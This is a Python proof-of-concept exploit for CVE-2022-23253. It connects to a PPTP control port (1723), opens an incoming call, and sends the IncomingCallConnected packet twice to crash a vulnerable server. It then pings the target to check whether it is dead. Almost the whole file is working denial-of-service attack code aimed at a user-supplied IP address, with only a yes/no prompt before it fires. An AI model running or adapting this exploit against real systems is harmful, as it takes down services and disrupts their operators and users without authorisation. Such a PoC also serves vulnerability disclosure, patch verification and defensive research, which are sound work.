
import socket
import select
import secrets
import argparse
from packets import *

CTL_PORT = 1723
TEST_SERVER = ""

class CtlClient():
    def __init__(self, serverIp, serverPort=CTL_PORT):
        self.IP = serverIp
        self.Port = serverPort

        self.Socket = None
        self.IsConnected = False

    def CtlCloseConn(self):
        self.Socket.close()

    def CtlSendMsg(self, CtlMessage, multiplier=1):
        if not self.IsConnected:
            raise RuntimeError("Attempted to send Ctl data on unconnected client")

        ctlmsgbuf: bytes = CtlMessage.build() * multiplier


        self.Socket.send(ctlmsgbuf)

    def CtlMultiSendMsg(self, CtlMessageArray):
        if not self.IsConnected:
            raise RuntimeError("Attempted to send Ctl data on unconnected client")

        sendBuffer = b""

        for CtlMsg in CtlMessageArray:
            sendBuffer += CtlMsg.build()

        self.Socket.send(sendBuffer)

    def CtlRecvMsg(self):
        chunks = []

        ready = select.select([self.Socket], [], [], 1)
        if ready[0]:
            chunk = self.Socket.recv(1024)
            chunks.append(chunk)

            while(len(chunk) == 1024):
                chunk = self.Socket.recv(1024)
                chunks.append(chunk)

        return b"".join(chunks)

    def CtlConnect(self, timeout=None):
        #Connect to the Ctl server 
        self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if timeout:
            self.Socket.settimeout(timeout)

        self.Socket.connect((self.IP, self.Port))
        self.IsConnected = True    

def startControlSession():
    pocClient = CtlClient(TEST_SERVER)
    initializeCtlConnection = StartControlConnectionRequest()
    pocClient.CtlConnect()
    pocClient.CtlSendMsg(initializeCtlConnection)
    StartControlReply_raw = pocClient.CtlRecvMsg()
    initializeCtlResponse = StartControlConnectionReply(packetBytes=StartControlReply_raw)

    if initializeCtlResponse.ErrorCode != 0 or initializeCtlResponse.ResultCode != 1:
        raise ValueError("[:(] PoC Failed unexpectadly due to server side error, investigation reqiured....")
    
    return pocClient

def poke_server():

    try:
        print("[+] Pokeing the target....")
        poke_client = CtlClient(TEST_SERVER)
        poke_client.CtlConnect(timeout=1)
        print("[-] Its alive!?")
    
    except Exception as e:
        print("[+] Yep, its dead")


def trigger_cve_2022_23253():
    print("[+] Starting PPTP control connection")
    
    pocClient = startControlSession()
    newCallId = secrets.randbelow(0x10000)
    newCallSerial = secrets.randbelow(0x10000)
    newIncomingCall = IncomingCallRequest(CallId=newCallId,CallSerialNumber=newCallSerial) #Requests Causing Issues
    print("[+] Creating new incoming call")
    pocClient.CtlSendMsg(newIncomingCall)
    
    ICReply_raw = pocClient.CtlRecvMsg()
    newIncomingCallReply = IncomingCallReply(packetBytes=ICReply_raw)
    print("[+] Incoming call reply received with call ID {}".format(newIncomingCallReply.CallId))
    if newIncomingCallReply.ResultCode != 1 or newIncomingCallReply.ErrorCode != 0:
        raise ValueError("[:(] PoC failed unexpecadle due to server side error... ")

    newIncomingCallConnected = IncomingCallConnected(newIncomingCallReply.CallId, 64, newIncomingCallReply.PacketRecvWindowSize, newIncomingCallReply.PacketTransitDelay)
    print("[+] Triggering Bug!")
    pocClient.CtlSendMsg(newIncomingCallConnected)
    pocClient.CtlSendMsg(newIncomingCallConnected)

    print("[+] Machine should be dead now, lets check!")
    poke_server()

def main():
    
    global TEST_SERVER
    global CTL_PORT

    parser = argparse.ArgumentParser(description="PoC for CVE-2022-23253!")
    parser.add_argument('--ip', type=str,required=True,dest="ip_address",help="IP address of the target server")
    parser.add_argument('--port', type=int, default=CTL_PORT,dest="ctl_port", help="Port of the PPTP CTL TCP socket, should remain as {} in most cases.".format(CTL_PORT))

    args = parser.parse_args()

    TEST_SERVER = args.ip_address
    CTL_PORT = args.ctl_port

    continue_to_trigger = input("[?] This PoC will crash a vulnerable server, do you want to continue [y/n]: ")

    if continue_to_trigger.lower() == "y":
        print("[+] Triggering Bug!")
        trigger_cve_2022_23253()
    else:
        print("[+] GoodBye!")

if __name__ == '__main__':
    main()
